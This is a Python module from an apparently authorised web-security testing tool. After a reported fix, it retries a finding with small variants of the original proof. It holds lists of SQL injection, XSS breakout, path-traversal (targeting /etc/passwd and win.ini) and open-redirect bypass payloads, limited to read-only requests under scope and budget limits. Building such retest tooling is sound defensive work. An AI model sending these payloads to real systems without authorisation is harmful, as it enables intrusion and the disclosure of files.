"""Fix breaking: after a retest says "fixed", try a small fixed set of variants of the proof.

A fix often blocks the exact payload that was reported and nothing else: one
quote style, one encoding, one path form. When the original proof of a
finding now fails, :func:`search` re-sends the same request with a fixed list
of variants of the same probe against the same parameter (or, for an IDOR,
the same object):

=================  ============================================================
``sqli``           other quote and comment contexts and encodings, each as a
                   TRUE/FALSE pair compared with the baseline value
``xss``            other breakouts and encodings of a markup-only marker (no
                   script runs); counted when the tag comes back unescaped in
                   an HTML response
``path_traversal`` other encodings and depths to the two world-readable marker
                   files of the probe; counted when the marker appears and was
                   not in the control response
``open_redirect``  other bypass forms to a fresh host under ``.example``;
                   counted when a redirect a browser follows goes there
``idor``           other path forms of the object URL and ``HEAD`` as the
                   attacker, and the neighbouring ids read by both accounts
=================  ============================================================

Only read-only requests are sent (GET, or HEAD for the IDOR method check), all
through the capture gateway, so scope, the rate limit and the ledger apply. A
proof whose request can change state is not varied here: that is a probe run
with the operator's approval. At most :data:`MAX_REQUESTS` requests per search.

The first variant that works becomes a new candidate finding, linked to the
original (its description names it; both histories get a ``variant_found``
event). Like every claim it counts only after the verifier re-proves it.
"""

from __future__ import annotations

import re
import secrets
from collections.abc import Callable
from dataclasses import dataclass, field
from typing import Any
from urllib.parse import quote, unquote_plus, urlsplit, urlunsplit

from buggy.capture.gateway import SAFE_METHODS, GatewayRefusal
from buggy.capture.probes import misc
from buggy.capture.probes.base import similarity, text
from buggy.capture.store import Capture
from buggy.findings.model import Finding
from buggy.findings.verifier import SAME_AS_MIN

MAX_REQUESTS = 12
NOTE = "retest-variant"
SOURCE = "retest:variant"

WORKS = "works"
NO = "no"
UNCLEAR = "unclear"

VARIANT_WORKS = "variant_works"
NO_VARIANT_WORKS = "no_variant_works"
COULD_NOT_TELL = "could_not_tell"
NOT_TRIED = "not_tried"

# sqli: TRUE and FALSE suffixes appended to the baseline value, by variant.
SQLI_VARIANTS: tuple[tuple[str, str, str], ...] = (
    ("double_quote", '" AND "1"="1', '" AND "1"="2'),
    ("parenthesis", "') AND ('1'='1", "') AND ('1'='2"),
    ("comment_dash", "' AND 1=1-- -", "' AND 1=2-- -"),
    ("comment_inline", "'/**/AND/**/'1'='1", "'/**/AND/**/'1'='2"),
    ("double_encoded_quote", "%27 AND %271%27=%271", "%27 AND %271%27=%272"),
)
#: How alike a TRUE answer must be to the baseline, and how unlike a FALSE one.
SQLI_TRUE_SIMILARITY = 0.95
SQLI_FALSE_SIMILARITY = 0.80
SQLI_STABLE = 0.98

# xss: (name, value as sent, the text that proves it when it comes back). ``{m}`` is the marker.
XSS_VARIANTS: tuple[tuple[str, str, str], ...] = (
    ("attribute_double_quote", '"><b data-buggy={m}>', '"><b data-buggy={m}>'),
    ("attribute_single_quote", "'><b data-buggy={m}>", "'><b data-buggy={m}>"),
    ("script_close", "</script><b data-buggy={m}>", "</script><b data-buggy={m}>"),
    ("svg_tag", "<svg data-buggy={m}>", "<svg data-buggy={m}>"),
    ("upper_case", "<B DATA-BUGGY={m}>", "<B DATA-BUGGY={m}>"),
    ("double_url_encoded", "%3Cb%20data-buggy%3D{m}%3E", "<b data-buggy={m}>"),
)
_HTML_TYPES = ("text/html", "application/xhtml+xml")

# path traversal: (name, the parameter's value on the wire). Not the probe's own forms.
TRAVERSAL_VARIANTS: tuple[tuple[str, str], ...] = (
    ("nested_dots", quote("....//" * 6 + "etc/passwd", safe="")),
    ("double_encoded", "%252e%252e%252f" * 6 + "etc%252fpasswd"),
    ("overlong_utf8", "..%c0%af" * 6 + "etc%c0%afpasswd"),
    ("backslash", quote("..\\" * 6 + "windows\\win.ini", safe="")),
    ("absolute", quote("/etc/passwd", safe="")),
    ("deep", quote("../" * 10 + "etc/passwd", safe="")),
)
TRAVERSAL_CONTROL_VALUE = "buggy-control.txt"

# open redirect: (name, value). ``{host}`` is a fresh .example host, ``{allowed}`` the site's.
REDIRECT_VARIANTS: tuple[tuple[str, str], ...] = (
    ("backslash", "/\\{host}/"),
    ("triple_slash", "///{host}/"),
    ("tab_in_slashes", "/\t/{host}/"),
    ("encoded_slashes", "%2F%2F{host}/"),
    ("allowed_as_subdomain", "https://{allowed}.{host}/"),
    ("allowed_in_query", "https://{host}/?{allowed}"),
)

# IDOR: other forms of the object's path, sent as the attacker. ``{path}`` has no trailing slash.
IDOR_PATH_VARIANTS: tuple[tuple[str, Callable[[str], str]], ...] = (
    ("trailing_slash", lambda path: path + "/"),
    ("upper_case", lambda path: _upper_first_static(path)),
    ("matrix_parameter", lambda path: path + ";buggy=1"),
    ("dot_segment", lambda path: _dot_segment(path)),
    ("json_suffix", lambda path: path + ".json"),
)
_LAST_NUMBER = re.compile(r"(?<=/)(\d{1,18})(?=/?$)")


def _upper_first_static(path: str) -> str:
    parts = path.split("/")
    for index, part in enumerate(parts):
        if part and not part.isdigit() and part.upper() != part:
            parts[index] = part.upper()
            break
    return "/".join(parts)


def _dot_segment(path: str) -> str:
    head, _, tail = path.rpartition("/")
    return f"{head}/./{tail}" if head else path


@dataclass
class Tried:
    """One variant: what was sent and what it showed."""

    name: str
    outcome: str
    reason: str
    capture_ids: list[str] = field(default_factory=list)
    assertions: list[dict[str, Any]] = field(default_factory=list)
    url: str = ""
    severity: str = ""

    def to_dict(self) -> dict[str, Any]:
        return {
            "name": self.name,
            "outcome": self.outcome,
            "reason": self.reason,
            "capture_ids": list(self.capture_ids),
        }


@dataclass
class Report:
    """What a variant search did: ``outcome`` is one of the four module constants."""

    family: str
    outcome: str
    reasons: list[str] = field(default_factory=list)
    tried: list[Tried] = field(default_factory=list)
    capture_ids: list[str] = field(default_factory=list)
    new_finding_ids: list[str] = field(default_factory=list)

    def to_dict(self) -> dict[str, Any]:
        return {
            "family": self.family,
            "outcome": self.outcome,
            "reasons": list(self.reasons),
            "tried": [t.to_dict() for t in self.tried],
            "capture_ids": list(self.capture_ids),
            "new_finding_ids": list(self.new_finding_ids),
        }


class _Budget(Exception):
    """The request budget of the search is spent."""


class _Sender:
    """Sends through the gateway, counts, and turns a refusal into ``None``."""

    def __init__(self, gateway: Any, engagement: str, sessions: Any, budget: int) -> None:
        self.gateway = gateway
        self.engagement = engagement
        self.sessions = sessions
        self.left = budget
        self.capture_ids: list[str] = []
        self.refusals: list[str] = []

    def send(
        self, base: Capture, url: str, *, method: str = "", identity: str = ""
    ) -> Capture | None:
        if self.left <= 0:
            raise _Budget
        self.left -= 1
        method = (method or base.method).upper()
        if method not in SAFE_METHODS:  # never reached: callers vary read-only requests only
            self.refusals.append(f"{method} is not read-only; not sent")
            return None
        extra: dict[str, Any] = {}
        if identity and self.sessions is not None:
            extra["identity"] = identity
        try:
            capture = self.gateway.send(
                self.engagement,
                method,
                url,
                headers=dict(base.request_headers),
                body=None,
                note=NOTE,
                **extra,
            )
        except GatewayRefusal as refusal:
            self.refusals.append(f"{refusal.code}: {str(refusal.detail)[:200]}")
            return None
        self.capture_ids.append(capture.id)
        return capture


def _answered(capture: Capture | None) -> bool:
    """A response that says something: no transport error, no 5xx."""
    return (
        capture is not None
        and capture.status is not None
        and not capture.error
        and (capture.status < 500)
    )


def _assertion(capture: Capture, **expect: Any) -> dict[str, Any]:
    full = {
        "status": capture.status,
        "body_contains": [],
        "body_not_contains": [],
        "differs_from": "",
        "same_as": "",
    }
    full.update({k: v for k, v in expect.items() if v not in (None, "", [])})
    return {"capture_id": capture.id, "identity": capture.identity, "expect": full}


# ── query parameters ─────────────────────────────────────────────────


def query_value(url: str, parameter: str) -> str | None:
    """The decoded value of ``parameter`` in ``url``'s query string, ``None`` if absent."""
    for pair in urlsplit(url).query.split("&"):
        name, _eq, value = pair.partition("=")
        if name and unquote_plus(name) == parameter:
            return unquote_plus(value)
    return None


def with_wire_value(url: str, parameter: str, wire: str) -> str | None:
    """``url`` with the first ``parameter`` value replaced by ``wire`` (already encoded)."""
    parts = urlsplit(url)
    out: list[str] = []
    done = False
    for pair in parts.query.split("&") if parts.query else []:
        name, _eq, _value = pair.partition("=")
        if not done and name and unquote_plus(name) == parameter:
            out.append(f"{name}={wire}")
            done = True
        else:
            out.append(pair)
    return urlunsplit(parts._replace(query="&".join(out))) if done else None


def _with_value(url: str, parameter: str, value: str) -> str | None:
    return with_wire_value(url, parameter, quote(value, safe=""))


# ── what each family needs from the finding ──────────────────────────


@dataclass
class _Context:
    finding: Finding
    cited: list[tuple[Any, Capture]]  # (assertion, its capture), in order
    send: _Sender

    def by_id(self, capture_id: str) -> Capture | None:
        for _assertion, capture in self.cited:
            if capture.id == capture_id:
                return capture
        return self.send.gateway.store.get(self.finding.engagement, capture_id)

    def with_parameter(self) -> list[tuple[Any, Capture]]:
        name = self.finding.parameter
        return [
            (a, c)
            for a, c in self.cited
            if name and c.method in SAFE_METHODS and query_value(c.url, name) is not None
        ]


def family_of(finding: Finding) -> str:
    """Which variant family fits ``finding``, ``""`` when none does."""
    probe = finding.source.split(":", 1)[1] if finding.source.startswith("probe:") else ""
    by_probe = {
        "sqli": "sqli",
        "xss_reflected": "xss",
        "path_traversal": "path_traversal",
        "open_redirect": "open_redirect",
        "idor": "idor",
    }
    if probe:
        return by_probe.get(probe, "")
    cwe = finding.cwe.upper()
    if finding.vuln_class == "injection":
        return "sqli" if cwe == "CWE-89" else ""
    if finding.vuln_class == "file_handling":
        return "path_traversal" if cwe == "CWE-22" else ""
    return {
        "xss": "xss",
        "open_redirect": "open_redirect",
        "access_control": "idor",
    }.get(finding.vuln_class, "")


def _sqli(ctx: _Context) -> list[Tried]:
    name = ctx.finding.parameter
    base: Capture | None = None
    for assertion, _capture in ctx.with_parameter():
        reference = assertion.expect.same_as or assertion.expect.differs_from
        candidate = ctx.by_id(reference) if reference else None
        if candidate is not None and query_value(candidate.url, name) is not None:
            base = candidate
            break
    if base is None:
        return [Tried("baseline", UNCLEAR, "no cited baseline request carries the parameter")]
    value = query_value(base.url, name) or ""
    first = ctx.send.send(base, base.url)
    second = ctx.send.send(base, base.url)
    if not (_answered(first) and _answered(second)) or first is None or second is None:
        return [Tried("baseline", UNCLEAR, "the baseline request got no usable answer")]
    if similarity(first, second) < SQLI_STABLE or first.status != second.status:
        return [Tried("baseline", UNCLEAR, "the baseline answer is not stable")]
    out: list[Tried] = []
    for variant, true_suffix, false_suffix in SQLI_VARIANTS:
        true_url = _with_value(base.url, name, value + true_suffix)
        false_url = _with_value(base.url, name, value + false_suffix)
        assert true_url is not None and false_url is not None
        true = ctx.send.send(base, true_url)
        false = ctx.send.send(base, false_url)
        ids = [c.id for c in (true, false) if c is not None]
        if not (_answered(true) and _answered(false)) or true is None or false is None:
            out.append(Tried(variant, UNCLEAR, "no usable answer", ids))
            continue
        alike = true.status == first.status and similarity(true, first) >= SQLI_TRUE_SIMILARITY
        unlike = false.status != first.status or similarity(false, first) < SQLI_FALSE_SIMILARITY
        if alike and unlike:
            out.append(
                Tried(
                    variant,
                    WORKS,
                    "the TRUE condition answers like the baseline and the FALSE one does not",
                    ids,
                    [
                        _assertion(first),
                        _assertion(true, same_as=first.id),
                        _assertion(false, differs_from=first.id),
                    ],
                    url=true_url,
                )
            )
            break
        out.append(Tried(variant, NO, "TRUE and FALSE answer alike, or TRUE differs", ids))
    return out


def _xss(ctx: _Context) -> list[Tried]:
    cited = ctx.with_parameter()
    if not cited:
        return [Tried("request", UNCLEAR, "no cited read-only request carries the parameter")]
    base = cited[0][1]
    marker = "bg" + secrets.token_hex(5)
    out: list[Tried] = []
    for variant, sent, proof in XSS_VARIANTS:
        url = _with_value(base.url, ctx.finding.parameter, sent.format(m=marker))
        assert url is not None
        capture = ctx.send.send(base, url)
        if not _answered(capture) or capture is None:
            out.append(Tried(variant, UNCLEAR, "no usable answer", [c.id for c in [capture] if c]))
            continue
        expected = proof.format(m=marker)
        media = str(
            next(
                (v for k, v in capture.response_headers.items() if k.lower() == "content-type"), ""
            )
        ).lower()
        if expected in text(capture) and any(t in media for t in _HTML_TYPES):
            out.append(
                Tried(
                    variant,
                    WORKS,
                    f"the markup came back unescaped in an HTML response: {expected}",
                    [capture.id],
                    [_assertion(capture, body_contains=[expected])],
                    url=url,
                )
            )
            break
        out.append(Tried(variant, NO, "the markup did not come back unescaped", [capture.id]))
    return out


def _traversal(ctx: _Context) -> list[Tried]:
    cited = ctx.with_parameter()
    if not cited:
        return [Tried("request", UNCLEAR, "no cited read-only request carries the parameter")]
    base = cited[0][1]
    name = ctx.finding.parameter
    control_url = _with_value(base.url, name, TRAVERSAL_CONTROL_VALUE)
    assert control_url is not None
    control = ctx.send.send(base, control_url)
    if not _answered(control) or control is None:
        return [Tried("control", UNCLEAR, "the control request got no usable answer")]
    already = {
        key for key, (_f, marker) in misc.MARKER_FILES.items() if marker.search(text(control))
    }
    out: list[Tried] = []
    for variant, wire in TRAVERSAL_VARIANTS:
        url = with_wire_value(base.url, name, wire)
        assert url is not None
        capture = ctx.send.send(base, url)
        if not _answered(capture) or capture is None:
            out.append(Tried(variant, UNCLEAR, "no usable answer", [c.id for c in [capture] if c]))
            continue
        body = text(capture)
        hit = next(
            (
                match.group(0)[:60]
                for key, (_file, marker) in misc.MARKER_FILES.items()
                if key not in already and (match := marker.search(body))
            ),
            "",
        )
        if hit:
            out.append(
                Tried(
                    variant,
                    WORKS,
                    f"a marker file's content came back: {hit!r}",
                    [capture.id],
                    [_assertion(capture, body_contains=[hit])],
                    url=url,
                )
            )
            break
        out.append(Tried(variant, NO, "no marker file content", [capture.id]))
    return out


def _redirect(ctx: _Context) -> list[Tried]:
    cited = ctx.with_parameter()
    if not cited:
        return [Tried("request", UNCLEAR, "no cited read-only request carries the parameter")]
    base = cited[0][1]
    name = ctx.finding.parameter
    original = query_value(base.url, name) or ""
    allowed = urlsplit(original).hostname or urlsplit(base.url).hostname or "example.com"
    host = misc.random_host()
    out: list[Tried] = []
    for variant, form in REDIRECT_VARIANTS:
        url = _with_value(base.url, name, form.format(host=host, allowed=allowed))
        assert url is not None
        capture = ctx.send.send(base, url)
        if capture is None or capture.status is None or capture.error:
            out.append(Tried(variant, UNCLEAR, "no answer", [c.id for c in [capture] if c]))
            continue
        target = next(
            (
                found
                for _kind, found in misc.redirect_targets(capture)
                if (browser := misc.browser_host(found, url)) is not None
                and (browser == host or browser.endswith("." + host))
            ),
            "",
        )
        if target:
            out.append(
                Tried(
                    variant,
                    WORKS,
                    f"the response sends the browser to {host}",
                    [capture.id],
                    [_assertion(capture)],
                    url=url,
                    severity="low",
                )
            )
            break
        out.append(Tried(variant, NO, "no redirect to the test host", [capture.id]))
    return out


def _owner_and_attacker(ctx: _Context) -> tuple[Any, Capture, Any, Capture] | None:
    """``(owner assertion, owner capture, attacker assertion, attacker capture)`` of an IDOR."""
    for assertion, capture in ctx.cited:
        owner_id = assertion.expect.same_as
        if not owner_id:
            continue
        for other, owner in ctx.cited:
            if owner.id == owner_id:
                return other, owner, assertion, capture
    return None


def _markers(assertion: Any) -> list[str]:
    return [m for m in assertion.expect.body_contains if m]


def _reads_owner(capture: Capture | None, owner: Capture, markers: list[str]) -> bool:
    if not _answered(capture) or capture is None or not 200 <= (capture.status or 0) < 300:
        return False
    body = text(capture)
    if markers and all(marker in body for marker in markers):
        return True
    return similarity(capture, owner) >= SAME_AS_MIN


def _idor(ctx: _Context) -> list[Tried]:
    pair = _owner_and_attacker(ctx)
    if pair is None:
        return [Tried("request", UNCLEAR, "the proof names no owner and attacker requests")]
    owner_assertion, owner, attacker_assertion, attacker = pair
    if attacker.method not in SAFE_METHODS or owner.method not in SAFE_METHODS:
        return [Tried("request", UNCLEAR, "the proof's requests are not read-only")]
    markers = _markers(attacker_assertion)
    as_attacker = attacker_assertion.identity
    as_owner = owner_assertion.identity
    parts = urlsplit(attacker.url)
    path = parts.path.rstrip("/") or "/"
    out: list[Tried] = []
    for variant, form in IDOR_PATH_VARIANTS:
        url = urlunsplit(parts._replace(path=form(path)))
        if url == attacker.url:
            continue
        capture = ctx.send.send(attacker, url, identity=as_attacker)
        if not _answered(capture) or capture is None:
            out.append(Tried(variant, UNCLEAR, "no usable answer", [c.id for c in [capture] if c]))
            continue
        if _reads_owner(capture, owner, markers):
            out.append(
                Tried(
                    variant,
                    WORKS,
                    "the attacker reads the owner's object through another form of its path",
                    [capture.id],
                    [
                        _assertion(owner, body_contains=markers),
                        _assertion(capture, same_as=owner.id, body_contains=markers),
                    ],
                    url=url,
                )
            )
            return out
        out.append(Tried(variant, NO, "refused or not the owner's object", [capture.id]))
    # HEAD: a check written for GET only.
    head = ctx.send.send(attacker, attacker.url, method="HEAD", identity=as_attacker)
    if _answered(head) and head is not None:
        if 200 <= (head.status or 0) < 300:
            out.append(
                Tried(
                    "head_method",
                    WORKS,
                    "HEAD answers 2xx for the object the attacker may not GET (its existence "
                    "and size leak; the check is per method)",
                    [head.id],
                    [_assertion(head)],
                    url=attacker.url,
                    severity="low",
                )
            )
            return out
        out.append(Tried("head_method", NO, f"HEAD answers {head.status}", [head.id]))
    else:
        out.append(Tried("head_method", UNCLEAR, "no usable answer", [c.id for c in [head] if c]))
    # The neighbouring objects, read by both accounts.
    match = _LAST_NUMBER.search(parts.path)
    if match is None:
        out.append(Tried("neighbour_ids", UNCLEAR, "the object id is not a number in the path"))
        return out
    number = int(match.group(1))
    for neighbour in (number + 1, number - 1):
        if neighbour < 0:
            continue
        neighbour_path = parts.path[: match.start(1)] + str(neighbour) + parts.path[match.end(1) :]
        url = urlunsplit(parts._replace(path=neighbour_path))
        theirs = ctx.send.send(owner, url, identity=as_owner)
        mine = ctx.send.send(attacker, url, identity=as_attacker)
        ids = [c.id for c in (theirs, mine) if c is not None]
        variant = f"neighbour_id_{neighbour}"
        if not (_answered(theirs) and _answered(mine)) or theirs is None or mine is None:
            out.append(Tried(variant, UNCLEAR, "no usable answer", ids))
            continue
        both_read = all(200 <= (c.status or 0) < 300 for c in (theirs, mine))
        same_object = similarity(mine, theirs) >= SAME_AS_MIN
        new_object = similarity(theirs, owner) < SAME_AS_MIN
        if both_read and same_object and new_object:
            out.append(
                Tried(
                    variant,
                    WORKS,
                    "both accounts read the same neighbouring object: at least one of them is "
                    "not its owner (unless it is public)",
                    ids,
                    [_assertion(theirs), _assertion(mine, same_as=theirs.id)],
                    url=url,
                )
            )
            return out
        out.append(Tried(variant, NO, "not readable by both accounts", ids))
    return out


_FAMILIES: dict[str, Callable[[_Context], list[Tried]]] = {
    "sqli": _sqli,
    "xss": _xss,
    "path_traversal": _traversal,
    "open_redirect": _redirect,
    "idor": _idor,
}


def try_variants(
    finding: Finding, gateway: Any, *, sessions: Any = None, budget: int = MAX_REQUESTS
) -> Report:
    """Send the variants that fit ``finding``; nothing is stored in the finding store."""
    family = family_of(finding)
    if not family:
        return Report("", NOT_TRIED, ["no variant set for this kind of finding"])
    cited: list[tuple[Any, Capture]] = []
    for assertion in finding.assertions:
        capture = gateway.store.get(finding.engagement, assertion.capture_id)
        if capture is not None:
            cited.append((assertion, capture))
    if any(capture.method not in SAFE_METHODS for _a, capture in cited):
        return Report(
            family,
            NOT_TRIED,
            ["the proof's requests can change state: run the probe with the operator's approval"],
        )
    sender = _Sender(gateway, finding.engagement, sessions, budget)
    try:
        tried = _FAMILIES[family](_Context(finding, cited, sender))
    except _Budget:
        tried = [Tried("budget", UNCLEAR, f"stopped after {budget} requests")]
    report = Report(family, NO_VARIANT_WORKS, tried=tried, capture_ids=sender.capture_ids)
    report.reasons += sender.refusals
    if any(t.outcome == WORKS for t in tried):
        report.outcome = VARIANT_WORKS
    elif any(t.outcome == UNCLEAR for t in tried) or not tried:
        report.outcome = COULD_NOT_TELL
    report.reasons += [f"{t.name}: {t.reason}" for t in tried if t.outcome != NO]
    return report


def _new_finding(finding: Finding, working: Tried, family: str) -> dict[str, Any]:
    """The candidate for a working variant, linked to ``finding`` by its description."""
    parameter = f"{finding.parameter} [variant: {working.name}]".strip()
    return {
        "engagement": finding.engagement,
        "title": f"{finding.title} (variant {working.name} still works after the fix)",
        "class": finding.vuln_class,
        "cwe": finding.cwe,
        "severity": working.severity or finding.severity,
        "endpoint": working.url or finding.endpoint,
        "method": "HEAD" if working.name == "head_method" else finding.method,
        "parameter": parameter,
        "source": SOURCE,
        "description": (
            f"Variant of {finding.id} ({finding.title}). A retest found that the original "
            f"{family} proof no longer works, but the variant {working.name!r} does: "
            f"{working.reason}. Captures: {', '.join(working.capture_ids)}."
        ),
        "remediation": finding.remediation,
        "assertions": working.assertions,
    }


def search(service: Any, finding: Finding, *, actor: str = "retest") -> Report:
    """Try the variants of a fixed finding; queue the first that works as a linked candidate."""
    from buggy.findings.candidates import enqueue  # noqa: PLC0415

    report = try_variants(finding, service.gateway, sessions=getattr(service, "sessions", None))
    working = next((t for t in report.tried if t.outcome == WORKS), None)
    if working is None:
        return report
    queued = enqueue(service, [_new_finding(finding, working, report.family)], actor)
    report.new_finding_ids = list(queued.get("ids") or [])
    if queued.get("errors"):
        report.reasons.append(f"the variant could not be queued: {queued['errors'][0]}")
    for new_id in report.new_finding_ids:
        detail = {"variant": working.name, "family": report.family}
        service.store.add_event(
            finding.engagement, finding.id, actor, "variant_found", {**detail, "finding_id": new_id}
        )
        service.store.add_event(
            finding.engagement, new_id, actor, "variant_of", {**detail, "finding_id": finding.id}
        )
    return report


__all__ = [
    "COULD_NOT_TELL",
    "MAX_REQUESTS",
    "NOT_TRIED",
    "NO_VARIANT_WORKS",
    "VARIANT_WORKS",
    "Report",
    "Tried",
    "family_of",
    "query_value",
    "search",
    "try_variants",
    "with_wire_value",
]
